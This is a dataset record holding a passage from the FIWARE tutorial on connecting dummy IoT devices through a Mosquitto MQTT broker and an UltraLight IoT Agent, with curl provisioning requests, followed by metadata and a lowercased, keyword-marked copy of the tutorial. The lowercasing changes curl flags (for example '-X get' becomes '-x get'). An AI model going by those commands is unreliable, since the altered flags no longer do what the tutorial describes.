sensor. The transport=MQTT attribute defines the communications protocol to be used. For MQTT communications, the endpoint attribute is not required as there is no HTTP URL where the device is listening for commands. The array of commands is mapped to directly to messages sent to the /<api-key>/<device-id>/cmd topic The commands array includes a list of each command that can be invoked.\nThe example below provisions a bell with the deviceId=bell001.\n6\ufe0f\u20e3 Request:\ncurl -iX POST \\\n'http://localhost:4041/iot/devices' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"bell001\",\n\"entity_name\": \"urn:ngsi-ld:Bell:001\",\n\"entity_type\": \"Bell\",\n\"protocol\": \"PDI-IoTA-UltraLight\",\n\"transport\": \"MQTT\",\n\"commands\": [\n{ \"name\": \"ring\", \"type\": \"command\" }\n],\n\"static_attributes\": [\n{\"name\":\"refStore\", \"type\": \"Relationship\",\"value\": \"urn:ngsi-ld:Store:001\"}\n]\n}\n]\n}\n'\nBefore we wire-up the context broker, we can test that a command can be sent from the IoT Agent to a device by making a REST request directly to the IoT Agent's North Port using the /v2/op/update endpoint. It is this endpoint that will eventually be invoked by the context broker once we have connected it up. To test the configuration you can run the command directly as shown:\n7\ufe0f\u20e3 Request:\ncurl -iX POST \\\nhttp://localhost:4041/v2/op/update \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"actionType\": \"update\",\n\"entities\": [\n{\n\"type\": \"Bell\",\n\"id\": \"urn:ngsi-ld:Bell:001\",\n\"ring\" : {\n\"type\": \"command\",\n\"value\": \"\"\n}\n}\n]\n}'\nIf you are viewing the device monitor page, you can also see the state of the bell change.\nThe result of the command to ring the bell can be read by querying the entity within the Orion Context Broker.\n8\ufe0f\u20e3 Request:\ncurl -X GET \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:Bell:001?type=Bell&options=keyValues' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /'\nResponse:\n{\n\"id\": \"urn:ngsi-ld:Bell:001\",\n\"type\": \"Bell\",\n\"TimeInstant\": \"2018-05-25T20:06:28.00Z\",\n\"refStore\": \"urn:ngsi-ld:Store:001\",\n\"ring_info\": \" ring OK\",\n\"ring_status\": \"OK\",\n\"ring\": \"\"\n}\nThe TimeInstant shows last the time any command associated with the entity has been invoked. The result of ring command can be seen in the value of the ring_info attribute.\nProvisioning a Smart Door\nProvisioning a device which offers both commands and measurements is merely a matter of making an HTTP POST request with both attributes and command attributes in the body of the request. Once again the transport=MQTT attribute defines the communications protocol to be used, and no endpoint attribute is required as there is no HTTP URL where the device is listening for commands.\n9\ufe0f\u20e3 Request:\ncurl -iX POST \\\n'http://localhost:4041/iot/devices' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"door001\",\n\"entity_name\": \"urn:ngsi-ld:Door:001\",\n\"entity_type\": \"Door\",\n\"protocol\": \"PDI-IoTA-UltraLight\",\n\"transport\": \"MQTT\",\n\"commands\": [\n{\"name\": \"unlock\",\"type\": \"command\"},\n{\"name\": \"open\",\"type\": \"command\"},\n{\"name\": \"close\",\"type\": \"command\"},\n{\"name\": \"lock\",\"type\": \"command\"}\n],\n\"attributes\": [\n{\"object_id\": \"s\", \"name\": \"state\", \"type\":\"Text\"}\n],\n\"static_attributes\": [\n{\"name\":\"refStore\", \"type\": \"Relationship\",\"value\": \"urn:ngsi-ld:Store:001\"}\n]\n}\n]\n}\n'\nProvisioning a Smart Lamp\nSimilarly, a Smart Lamp with two commands (on and off) and two attributes can be provisioned as follows:\n1\ufe0f\u20e30\ufe0f\u20e3 Request:\ncurl -iX POST \\\n'http://localhost:4041/iot/devices' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"lamp001\",\n\"entity_name\": \"urn:ngsi-ld:Lamp:001\",\n\"entity_type\": \"Lamp\",\n\"protocol\": \"PDI-IoTA-UltraLight\",\n\"transport\": \"MQTT\",\n\"commands\": [\n{\"name\": \"on\",\"type\": \"command\"},\n{\"name\": \"off\",\"type\": \"command\"}\n],\n\"attributes\": [\n{\"object_id\": \"s\", \"name\": \"state\", \"type\":\"Text\"},\n{\"object_id\": \"l\", \"name\": \"luminosity\", \"type\":\"Integer\"}\n],\n\"static_attributes\": [\n{\"name\":\"refStore\", \"type\": \"Relationship\",\"value\": \"urn:ngsi-ld:Store:001\"}\n]\n}\n]\n}\n'\nThe full list of provisioned devices can be obtained by making a GET request to the /iot/devices endpoint.\n1\ufe0f\u20e31\ufe0f\u20e3 Request:\ncurl -X GET \\\n'http://localhost:4041/iot/devices' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /'\nEnabling Context Broker Commands\nHaving connected up the IoT Agent to the IoT devices, the Orion Context Broker was informed that the commands now are available. In other words the IoT Agent registered itself as a Context Provider for the command attributes.\nOnce the commands have been registered it will be possible to ring the Bell, open and close the Smart Door and switch the Smart Lamp on and off by sending requests to the Orion Context Broker, rather than sending UltraLight 2.0 requests directly the IoT devices as we did in the previous tutorial\nAll the communications leaving and arriving at the North port of the IoT Agent use the standard NGSI syntax. The transport protocol used between the IoT devices and the IoT Agent is irrelevant to this layer of communication. Effectively the IoT Agent is offering a simplified facade pattern of well-known endpoints to actuate any device.\nTherefore this section of registering and invoking commands duplicates the instructions found in the previous tutorial\nRinging the Bell\nTo invoke the ring command, the ring attribute must be updated in the context.\n1\ufe0f\u20e32\ufe0f\u20e3 Request:\ncurl -iX PATCH \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:Bell:001/attrs' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"ring\": {\n\"type\" : \"command\",\n\"value\" : \"\"\n}\n}'\nIf you are viewing the device monitor page, you can also see the state of the bell change.\nOpening the Smart Door\nTo invoke the open command, the open attribute must be updated in the context.\n1\ufe0f\u20e33\ufe0f\u20e3 Request:\ncurl -iX PATCH \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:Door:001/attrs' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"open\": {\n\"type\" : \"command\",\n\"value\" : \"\"\n}\n}'\nSwitching on the Smart Lamp\nTo switch on the Smart Lamp, the on attribute must be updated in the context.\n1\ufe0f\u20e34\ufe0f\u20e3 Request:\ncurl -iX PATCH \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:Lamp:001/attrs' \\\n-H 'Content-Type: application/json' \\\n-H 'fiware-service: openiot' \\\n-H 'fiware-servicepath: /' \\\n-d '{\n\"on\": {\n\"type\" : \"command\",\n\"value\" : \"\"\n}\n}'\nNext Steps\nWant to learn how to add more complexity to your application by adding advanced features? You can find out by reading the other tutorials in this series\nLicense\nMIT \u00a9 2018-2020 FIWARE Foundation e.V.\nFootnotes\nWikipedia: MQTT - a central communication point (known as the MQTT broker) which is in charge of dispatching all messages between services", "link": "https://github.com/FIWARE/tutorials.IoT-over-MQTT", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "this tutorial uses introduces the use of the mqtt protocol across iot devices connecting to fiware. the ultralight 2.0 iot agent created in the previous tutorial is reconfigured to communicate with a set of dummy iot devices using mqtt via a mosquitto message broker\nthe tutorial uses curl commands throughout, but is also available as postman documentation\n\u3053\u306e\u30c1\u30e5\u30fc\u30c8\u30ea\u30a2\u30eb\u306f\u65e5\u672c\u8a9e\u3067\u3082\u3054\u89a7\u3044\u305f\u3060\u3051\u307e\u3059\u3002\ncontents\ndetails\nwhat is mqtt?\n\"with the technology at our disposal, the possibilities are unbounded. all we need to do is make sure we keep talking.\"\n\u2014 stephen hawking\n\"mqtt is a publish-subscribe-based messaging protocol used in the internet of things. it works on top of the tcp/ip protocol, and is designed for connections with remote locations where a \"small code footprint\" is required or the network bandwidth is limited. the goal is to provide a protocol, which is bandwidth-efficient and uses little battery power.\"1\nthe previous tutorial used http as its transport mechanism between the devices and the iot agent. http uses a request/response paradigm where each device connects directly to the iot agent. mqtt is different in that publish-subscribe is event-driven and pushes messages to clients. it requires an additional central communication point (known as the mqtt broker) which it is in charge of dispatching all messages between the senders and the rightful receivers. each client that publishes a message to the broker, includes a topic into the message. the topic is the routing information for the broker. each client that wants to receive messages subscribes to a certain topic and the broker delivers all messages with the matching topic to the client. therefore the clients don\u2019t have to know each other, they only communicate over the topic. this architecture enables highly scalable solutions without dependencies between the data producers and the data consumers.\na summary of the differences between the two transport protocols can be seen below:\nhttp transport mqtt transport\niot agent communicates with iot devices directly iot agent communicates with iot devices indirectly via an mqtt broker\nrequest-response paradigm publish-subscribe paradigm\niot devices must always be ready to receive communication iot devices choose when to receive communication\nhigher power requirement low power requirement\nthe ultralight 2.0 iot agent will only send or interpret messages using the ultralight 2.0 syntax, however it can be used to send and receive messages over multiple transport mechanisms. therefore we are able to use the same fiware generic enabler to connect to a wider range of iot devices.\nmosquitto mqtt broker\nmosquitto is a readily available, open source mqtt broker which will be used during this tutorial. it is available licensed under epl/edl. more information can be found at https://mosquitto.org/\ndevice monitor\nfor the purpose of this tutorial, a series of dummy iot devices have been created, which will be attached to the context broker. details of the architecture and protocol used can be found in the iot sensors tutorial the state of each device can be seen on the ultralight device monitor web page found at: http://localhost:3000/device/monitor\narchitecture\nthis application builds on the components created in previous tutorials. it will make use of two fiware components - the orion context broker and the iot agent for ultralight 2.0. usage of the orion context broker is sufficient for an application to qualify as \u201cpowered by fiware\u201d. both the orion context broker and the iot agent rely on open source mongodb technology to keep persistence of the information they hold. we will also be using the dummy iot devices created in the previous tutorial additionally we will add an instance of the mosquitto mqtt broker which is open source and available under the epl/edl.\ntherefore the overall architecture will consist of the following elements:\nthe fiware orion context broker which will receive requests using ngsi-v2\nthe fiware iot agent for ultralight 2.0 which will:\nreceive southbound requests using ngsi-v2 and convert them to ultralight 2.0 mqtt topics for the mqtt broker\nlisten to the mqtt broker on registered topics to send measurements northbound\nthe mosquitto mqtt broker which acts as a central communication point, passing mqtt topics between the iot agent and iot devices as necessary.\nthe underlying mongodb database :\nused by the orion context broker to hold context data information such as data entities, subscriptions and registrations\nused by the iot agent to hold device information such as device urls and keys\na webserver acting as set of dummy iot devices using the ultralight 2.0 protocol running over mqtt.\nthe context provider ngsi proxy is not used in this tutorial. it does the following:\nreceive requests using ngsi-v2\nmakes requests to publicly available data sources using their own apis in a proprietary format\nreturns context data back to the orion context broker in ngsi-v2 format.\nthe stock management frontend is not used in this tutorial will it does the following:\ndisplay store information\nshow which products can be bought at each store\nallow users to \"buy\" products and reduce the stock count.\nsince all interactions between the elements are initiated by http or mqtt requests over tcp, the entities can be containerized and run from exposed ports.\nthe necessary configuration information for wiring up the mosquitto mqtt broker, the iot devices and the iot agent can be seen in the services section of the associated docker-compose.yml file:\nmosquitto configuration\nmosquitto:\nimage: eclipse-mosquitto\nhostname: mosquitto\ncontainer_name: mosquitto\nnetworks:\n- default\nexpose:\n- \"1883\"\n- \"9001\"\nports:\n- \"1883:1883\"\n- \"9001:9001\"\nvolumes:\n- ./mosquitto/mosquitto.conf:/mosquitto/config/mosquitto.conf\nthe mosquitto container is listening on two ports:\nport 1883 is exposed so we can post mqtt topics\nport 9001 is the standard port for http/websocket communications\nthe attached volume is a configuration file used to increase the debug level of the mqtt message broker.\ndummy iot devices configuration\ntutorial:\nimage: fiware/tutorials.context-provider\nhostname: iot-sensors\ncontainer_name: fiware-tutorial\nnetworks:\n- default\nexpose:\n- \"3000\"\n- \"3001\"\nports:\n- \"3000:3000\"\n- \"3001:3001\"\nenvironment:\n- \"debug=tutorial:*\"\n- \"web_app_port=3000\"\n- \"dummy_devices_port=3001\"\n- \"dummy_devices_api_key=4jggokgpepnvsb2uv4s40d59ov\"\n- \"dummy_devices_transport=mqtt\"\nthe tutorial container is listening on two ports:\nport 3000 is exposed so we can see the web page displaying the dummy iot devices.\nport 3001 is exposed purely for tutorial access - so that curl or postman can make ultralight commands without being part of the same network.\nthe tutorial container is driven by environment variables as shown:\nkey value description\ndebug tutorial:* debug flag used for logging\nweb_app_port 3000 port used by web-app which displays the dummy device data\ndummy_devices_port 3001 port used by the dummy iot devices to receive commands\ndummy_devices_api_key 4jggokgpepnvsb2uv4s40d59ov random security key used for ultralight interactions - used to ensure the integrity of interactions between the devices and the iot agent\ndummy_devices_transport mqtt the transport protocol used by the dummy iot devices\nthe other tutorial container configuration values described in the yaml file are not used in this tutorial.\niot agent for ultralight 2.0 configuration\nthe iot agent for ultralight 2.0 can be instantiated within a docker container. an official docker image is available from docker hub tagged fiware/iotagent-ul. the necessary configuration can be seen below:\niot-agent:\nimage: fiware/iotagent-ul:latest\nhostname: iot-agent\ncontainer_name: fiware-iot-agent\ndepends_on:\n- mongo-db\nnetworks:\n- default\nexpose:\n- \"4041\"\nports:\n- \"4041:4041\"\nenvironment:\n- iota_cb_host=orion\n- iota_cb_port=1026\n- iota_north_port=4041\n- iota_registry_type=mongodb\n- iota_log_level=debug\n- iota_timestamp=true\n- iota_cb_ngsi_version=v2\n- iota_autocast=true\n- iota_mongo_host=mongo-db\n- iota_mongo_port=27017\n- iota_mongo_db=iotagentul\n- iota_provider_url=http://iot-agent:4041\n- iota_mqtt_host=mosquitto\n- iota_mqtt_port=1883\nthe iot-agent container relies on the presence of the orion context broker and uses a mongodb database to hold device information such as device urls and keys. the container is listening on a single port:\nport 4041 is exposed purely for tutorial access - so that curl or postman can make provisioning commands without being part of the same network.\nthe iot-agent container is driven by environment variables as shown:\nkey value description\niota_cb_host orion hostname of the context broker to update context\niota_cb_port 1026 port that context broker listens on to update context\niota_north_port 4041 port used for configuring the iot agent and receiving context updates from the context broker\niota_registry_type mongodb whether to hold iot device info in memory or in a database\niota_log_level debug the log level of the iot agent\niota_timestamp true whether to supply timestamp information with each measurement received from attached devices\niota_cb_ngsi_version v2 whether to supply use ngsi v2 when sending updates for active attributes\niota_autocast true ensure ultralight number values are read as numbers not strings\niota_mongo_host context-db the hostname of mongodb - used for holding device information\niota_mongo_port 27017 the port mongodb is listening on\niota_mongo_db iotagentul the name of the database used in mongodb\niota_provider_url http://iot-agent:4041 url passed to the context broker when commands are registered, used as a forwarding url location when the context broker issues a command to a device\niota_mqtt_host mosquitto the hostname of the mqtt broker\niota_mqtt_port 1883 the port the mqtt broker is listening on to receive topics\nas you can see, use of the mqtt transport is driven by only two environment variables iota_mqtt_host and iota_mqtt_port\nprerequisites\ndocker and docker compose\nto keep things simple all components will be run using docker. docker is a container technology which allows to different components isolated into their respective environments.\nto install docker on windows follow the instructions here\nto install docker on mac follow the instructions here\nto install docker on linux follow the instructions here\ndocker compose is a -----> tool !!!  for defining and running multi-container docker applications. a yaml file is used configure the required services for the application. this means all container services can be brought up in a single command. docker compose is installed by default as part of docker for windows and docker for mac, however linux users will need to follow the instructions found here\nyou can check your current docker and docker compose versions using the following commands:\ndocker-compose -v\ndocker version\nplease ensure that you are using docker version 20.10 or higher and docker compose 1.29 or higher and upgrade if necessary.\ncygwin for windows\nwe will start up our services using a simple bash script. windows users should download cygwin to provide a command-line functionality similar to a linux distribution on windows.\nstart up\nbefore you start you should ensure that you have obtained or built the necessary docker images locally. please clone the repository and create the necessary images by running the commands as shown:\ngit clone https://github.com/fiware/tutorials.iot-over-mqtt.git\ncd tutorials.iot-over-mqtt\ngit checkout ngsi-v2\n./services create\nthereafter, all services can be initialized from the command-line by running the services bash script provided within the repository:\n./services start\n\u2139\ufe0f note: if you want to clean up and start over again you can do so with the following command:\n./services stop\nprovisioning an iot agent (ultralight over mqtt)\nto follow the tutorial correctly please ensure you have the device monitor page available in your browser and click on the page to enable audio before you enter any curl commands. the device monitor displays the current state of an array of dummy devices using ultralight 2.0 syntax\ndevice monitor\nthe device monitor can be found at: http://localhost:3000/device/monitor\nchecking mosquitto health\nwe will start by mimicking the roles of both the iot agent and a dummy iot device and send and receive some messages using mqtt. this section of the tutorial requires several open terminals.\nstart an mqtt subscriber (1\ufe0f\u20e3st terminal)\neventually once we have wired by the system correctly, iot agent will subscribe to all relevant events to listen for northbound traffic in the form of sensor measurements. it therefore will need to make a subscription across all topics. similarly an actuator must subscribe to a single topic to receive events which effect itself when commands are sent southbound. to check that the lines of communication are open, we can subscribe to a given topic, and see that we are able to receive something when a message is published.\nopen a new terminal, and create a new running mqtt-subscriber docker container as follows:\ndocker run -it --rm --name mqtt-subscriber \\\n--network fiware_default efrecon/mqtt-client sub -h mosquitto -t \"/#\"\nthe terminal will then be ready to receive events\nstart an mqtt publisher (2\ufe0f\u20e3nd terminal)\na sensor sending northbound measurements will publish to those measurements to the mqtt broker to be passed on to any subscriber than wants them. the sensor will not need to make a connection to the subscriber directly.\nopen a new terminal, and run a mqtt-publisher docker container to send a message as follows:\ndocker run -it --rm --name mqtt-publisher \\\n--network fiware_default efrecon/mqtt-client pub -h mosquitto -m \"hello world\" -t \"/test\"\n1\ufe0f\u20e3st terminal - result:\nif the mqtt broker is functioning correctly, the message should be received in the other terminal\nhello world\nstop an mqtt subscriber (2\ufe0f\u20e3nd terminal)\nto terminate the mqtt subscriber, run the following docker command:\ndocker stop mqtt-subscriber\nshow mosquitto log\nto show that the communication occurred via the mqtt broker, we can inspect the log of the mosquitto docker container as shown:\ndocker logs --tail 10 mosquitto\nresult:\n1529661883: new client connected from 172.18.0.5 as mqttjs_8761e518 (c1, k0).\n1529662472: new connection from 172.18.0.7 on port 1883.\n1529662472: new client connected from 172.18.0.7 as mosqpub|1-5637527c63c1 (c1, k60).\n1529662472: client mosqpub|1-5637527c63c1 disconnected.\n1529662614: new connection from 172.18.0.7 on port 1883.\n1529662614: new client connected from 172.18.0.7 as mosqsub|1-64b27d675f58 (c1, k60).\n1529662623: new connection from 172.18.0.8 on port 1883.\n1529662623: new client connected from 172.18.0.8 as mosqpub|1-ef03e74b0270 (c1, k60).\n1529662623: client mosqpub|1-ef03e74b0270 disconnected.\n1529667841: socket error on client mosqsub|1-64b27d675f58, disconnecting.\nchecking the iot agent service health\nyou can check if the iot agent is running by making an http request to the exposed port:\n1\ufe0f\u20e3 request:\ncurl -x get \\\n'http://localhost:4041/iot/about'\nthe response will look similar to the following:\n{\n\"libversion\": \"2.6.0-next\",\n\"port\": \"4041\",\n\"baseroot\": \"/\",\n\"version\": \"1.6.0-next\"\n}\nwhat if i get a failed to connect to localhost port 4041: connection refused response?\nif you get a connection refused response, the iot agent cannot be found where expected for this tutorial - you will need to substitute the url and port in each curl command with the corrected ip address. all the curl commands tutorial assume that the iot agent is available on localhost:4041.\ntry the following remedies:\nto check that the docker containers are running try the following:\ndocker ps\nyou should see four containers running. if the iot agent is not running, you can restart the containers as necessary. this command will also display open port information.\nif you have installed docker-machine and virtual box, the context broker, iot agent and dummy device docker containers may be running from another ip address - you will need to retrieve the virtual host ip as shown:\ncurl -x get \\\n'http://$(docker-machine ip default):4041/version'\nalternatively run all your curl commands from within the container network:\ndocker run --network fiware_default --rm appropriate/curl -s \\\n-x get 'http://iot-agent:4041/iot/about'\nconnecting iot devices\nthe iot agent acts as a middleware between the iot devices and the context broker. it therefore needs to be able to create context data entities with unique ids. once a service has been provisioned and an unknown device makes a measurement the iot agent add this to the context using the supplied <device-id> (unless the device is recognized and can be mapped to a known id.\nthere is no guarantee that every supplied iot device <device-id> will always be unique, therefore all provisioning requests to the iot agent require two mandatory headers:\nfiware-service header is defined so that entities for a given service can be held in a separate mongodb database.\nfiware-servicepath can be used to differentiate between arrays of devices.\nfor example within a smart city application you would expect different fiware-service headers for different departments (e.g. parks, transport, refuse collection etc.) and each fiware-servicepath would refer to specific park and so on. this would mean that data and devices for each service can be identified and separated as needed, but the data would not be siloed - for example data from a smart bin within a park can be combined with the gps unit of a refuse truck to alter the route of the truck in an efficient manner.\nthe smart bin and gps unit are likely to come from different manufacturers and it cannot be guaranteed that there is no overlap within <device-id>s used. the use of the fiware-service and fiware-servicepath headers can ensure that this is always the case, and allows the context broker to identify the original source of the context data.\nprovisioning a service group for mqtt\ninvoking group provision is always the first step in connecting devices. for mqtt communication, provisioning supplies the authentication key so the iot agent will know which topic it must subscribe to.\nit is possible to set up default commands and attributes for all devices as well, but this is not done within this tutorial as we will be provisioning each device separately.\nthis example provisions an anonymous group of devices. it tells the iot agent that a series of devices will be communicating by sending messages to the /4jggokgpepnvsb2uv4s40d59ov topic\nthe resource attribute is left blank since http communication is not being used. the url location of cbroker is an optional attribute - if it is not provided, the iot agent uses the default context broker url as defined in the configuration file, however it has been added here for completeness.\n2\ufe0f\u20e3 request:\ncurl -ix post \\\n'http://localhost:4041/iot/services' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"services\": [\n{\n\"apikey\": \"4jggokgpepnvsb2uv4s40d59ov\",\n\"cbroker\": \"http://orion:1026\",\n\"entity_type\": \"thing\",\n\"resource\": \"\"\n}\n]\n}'\nprovisioning a sensor\nit is common good practice to use urns following the ngsi-ld specification when creating entities. furthermore it is easier to understand meaningful names when defining data attributes. these mappings can be defined by provisioning a device individually.\nthree types of measurement attributes can be provisioned:\nattributes are active readings from the device\nlazy attributes are only sent on request - the iot agent will inform the device to return the measurement\nstatic_attributes are as the name suggests static data about the device (such as relationships) passed on to the context broker.\nnote: in the case where individual ids are not required, or aggregated data is sufficient the attributes can be defined within the provisioning service rather than individually.\n3\ufe0f\u20e3 request:\ncurl -ix post \\\n'http://localhost:4041/iot/devices' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"motion001\",\n\"entity_name\": \"urn:ngsi-ld:motion:001\",\n\"entity_type\": \"motion\",\n\"protocol\": \"pdi-iota-ultralight\",\n\"transport\": \"mqtt\",\n\"timezone\": \"europe/berlin\",\n\"attributes\": [\n{ \"object_id\": \"c\", \"name\": \"count\", \"type\": \"integer\" }\n],\n\"static_attributes\": [\n{ \"name\":\"refstore\", \"type\": \"relationship\", \"value\": \"urn:ngsi-ld:store:001\"}\n]\n}\n]\n}\n'\nin the request we are associating the device motion001 with the urn urn:ngsi-ld:motion:001 and mapping the device reading c with the context attribute count (which is defined as an integer) a refstore is defined as a static_attribute, placing the device within store urn:ngsi-ld:store:001.\nthe addition of the transport=mqtt attribute in the body of the request is sufficient to tell the iot agent that it should subscribe to the /<api-key>/<device-id> topic to receive measurements.\nyou can simulate a dummy iot device measurement coming from the motion sensor device motion001, by posting an mqtt message to the following topic\n4\ufe0f\u20e3 mqtt request:\ndocker run -it --rm --name mqtt-publisher --network \\\nfiware_default efrecon/mqtt-client pub -h mosquitto -m \"c|1\" \\\n-t \"/4jggokgpepnvsb2uv4s40d59ov/motion001/attrs\"\nthe value of the -m parameter defines the message. this is in ultralight syntax.\nthe value of the -t parameter defines the topic.\nthe topic must be in the following form:\n/<api-key>/<device-id>/attrs\nnote in the previous tutorial, when testing http connectivity between the motion sensor and an iot agent, a similar dummy http request was sent to update the count value. this time the iot agent is configured to listen to mqtt topics, and we need to post a dummy message to an mqtt topic.\nwhen using the mqtt transport protocol, the iot agent is subscribing to the mqtt topics and the device monitor will be configured to display all mqtt messages sent to each topic - effectively it is showing the list messages received and sent by mosquitto.\nwith the iot agent connected via mqtt, the service group has defined the topic which the agent is subscribed to. since the api-key matches the root of the topic, the mqtt message from the motion sensor is passed to the iot agent which has previously subscribed.\nbecause we have specifically provisioned the device (motion001) - the iot agent is able to map attributes before raising a request with the orion context broker.\nyou can see that a measurement has been recorded by retrieving the entity data from the context broker. don't forget to add the fiware-service and fiware-service-path headers.\n5\ufe0f\u20e3 request:\ncurl -x get \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:motion:001?type=motion' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /'\nresponse:\n{\n\"id\": \"urn:ngsi-ld:motion:001\",\n\"type\": \"motion\",\n\"timeinstant\": {\n\"type\": \"iso8601\",\n\"value\": \"2018-05-25t10:51:32.00z\",\n\"metadata\": {}\n},\n\"count\": {\n\"type\": \"integer\",\n\"value\": \"1\",\n\"metadata\": {\n\"timeinstant\": {\n\"type\": \"iso8601\",\n\"value\": \"2018-05-25t10:51:32.646z\"\n}\n}\n}\n}\nthe response shows that the motion sensor device with id=motion001 has been successfully identified by the iot agent and mapped to the entity id=urn:ngsi-ld:motion:001. this new entity has been created within the context data. the c attribute from the dummy device measurement request has been mapped to the more meaningful count attribute within the context. as you will notice, a timeinstant attribute has been added to both the entity and the metadata of the attribute - this represents the last time the entity and attribute have been updated, and is automatically added to each new entity because the iota_timestamp environment variable was set when the iot agent was started up.\nprovisioning an actuator\nprovisioning an actuator is similar to provisioning a sensor. the transport=mqtt attribute defines the communications protocol to be used. for mqtt communications, the endpoint attribute is not required as there is no http url where the device is listening for commands. the array of commands is mapped to directly to messages sent to the /<api-key>/<device-id>/cmd topic the commands array includes a list of each command that can be invoked.\nthe example below provisions a bell with the deviceid=bell001.\n6\ufe0f\u20e3 request:\ncurl -ix post \\\n'http://localhost:4041/iot/devices' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"bell001\",\n\"entity_name\": \"urn:ngsi-ld:bell:001\",\n\"entity_type\": \"bell\",\n\"protocol\": \"pdi-iota-ultralight\",\n\"transport\": \"mqtt\",\n\"commands\": [\n{ \"name\": \"ring\", \"type\": \"command\" }\n],\n\"static_attributes\": [\n{\"name\":\"refstore\", \"type\": \"relationship\",\"value\": \"urn:ngsi-ld:store:001\"}\n]\n}\n]\n}\n'\nbefore we wire-up the context broker, we can test that a command can be sent from the iot agent to a device by making a rest request directly to the iot agent's north port using the /v2/op/update endpoint. it is this endpoint that will eventually be invoked by the context broker once we have connected it up. to test the configuration you can run the command directly as shown:\n7\ufe0f\u20e3 request:\ncurl -ix post \\\nhttp://localhost:4041/v2/op/update \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"actiontype\": \"update\",\n\"entities\": [\n{\n\"type\": \"bell\",\n\"id\": \"urn:ngsi-ld:bell:001\",\n\"ring\" : {\n\"type\": \"command\",\n\"value\": \"\"\n}\n}\n]\n}'\nif you are viewing the device monitor page, you can also see the state of the bell change.\nthe result of the command to ring the bell can be read by querying the entity within the orion context broker.\n8\ufe0f\u20e3 request:\ncurl -x get \\\n'http://localhost:1026/v2/entities/urn:ngsi-ld:bell:001?type=bell&options=keyvalues' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /'\nresponse:\n{\n\"id\": \"urn:ngsi-ld:bell:001\",\n\"type\": \"bell\",\n\"timeinstant\": \"2018-05-25t20:06:28.00z\",\n\"refstore\": \"urn:ngsi-ld:store:001\",\n\"ring_info\": \" ring ok\",\n\"ring_status\": \"ok\",\n\"ring\": \"\"\n}\nthe timeinstant shows last the time any command associated with the entity has been invoked. the result of ring command can be seen in the value of the ring_info attribute.\nprovisioning a smart door\nprovisioning a device which offers both commands and measurements is merely a matter of making an http post request with both attributes and command attributes in the body of the request. once again the transport=mqtt attribute defines the communications protocol to be used, and no endpoint attribute is required as there is no http url where the device is listening for commands.\n9\ufe0f\u20e3 request:\ncurl -ix post \\\n'http://localhost:4041/iot/devices' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"door001\",\n\"entity_name\": \"urn:ngsi-ld:door:001\",\n\"entity_type\": \"door\",\n\"protocol\": \"pdi-iota-ultralight\",\n\"transport\": \"mqtt\",\n\"commands\": [\n{\"name\": \"unlock\",\"type\": \"command\"},\n{\"name\": \"open\",\"type\": \"command\"},\n{\"name\": \"close\",\"type\": \"command\"},\n{\"name\": \"lock\",\"type\": \"command\"}\n],\n\"attributes\": [\n{\"object_id\": \"s\", \"name\": \"state\", \"type\":\"text\"}\n],\n\"static_attributes\": [\n{\"name\":\"refstore\", \"type\": \"relationship\",\"value\": \"urn:ngsi-ld:store:001\"}\n]\n}\n]\n}\n'\nprovisioning a smart lamp\nsimilarly, a smart lamp with two commands (on and off) and two attributes can be provisioned as follows:\n1\ufe0f\u20e30\ufe0f\u20e3 request:\ncurl -ix post \\\n'http://localhost:4041/iot/devices' \\\n-h 'content-type: application/json' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /' \\\n-d '{\n\"devices\": [\n{\n\"device_id\": \"lamp001\",\n\"entity_name\": \"urn:ngsi-ld:lamp:001\",\n\"entity_type\": \"lamp\",\n\"protocol\": \"pdi-iota-ultralight\",\n\"transport\": \"mqtt\",\n\"commands\": [\n{\"name\": \"on\",\"type\": \"command\"},\n{\"name\": \"off\",\"type\": \"command\"}\n],\n\"attributes\": [\n{\"object_id\": \"s\", \"name\": \"state\", \"type\":\"text\"},\n{\"object_id\": \"l\", \"name\": \"luminosity\", \"type\":\"integer\"}\n],\n\"static_attributes\": [\n{\"name\":\"refstore\", \"type\": \"relationship\",\"value\": \"urn:ngsi-ld:store:001\"}\n]\n}\n]\n}\n'\nthe full list of provisioned devices can be obtained by making a get request to the /iot/devices endpoint.\n1\ufe0f\u20e31\ufe0f\u20e3 request:\ncurl -x get \\\n'http://localhost:4041/iot/devices' \\\n-h 'fiware-service: openiot' \\\n-h 'fiware-servicepath: /'\nenabling 